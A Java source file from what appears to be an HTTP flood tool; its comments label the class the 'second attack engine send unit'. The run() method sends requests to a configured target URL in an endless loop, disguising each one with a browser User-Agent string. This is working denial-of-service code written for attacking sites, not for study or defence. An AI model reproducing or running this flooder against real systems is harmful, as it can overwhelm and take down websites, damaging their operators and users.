package com.zhanyingwl.www;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @ClassName : twoHttpSend
 * @Description : 第二攻击引擎发送单元
 * @Author : 战鹰
 * @Version: 1.0
 */

public class twoHttpSend extends oneHttpSend {
    @Override
    public void run() {
        try {

            while (!Thread.currentThread().isInterrupted()) {

                URL url = new URL(doConnect.twourl); // 载入第二攻击引擎的URL
                HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection(); // 打开HTTP连接
                httpURLConnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"); // 设置UA
                httpURLConnection.getResponseCode();
                httpURLConnection.disconnect();

            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
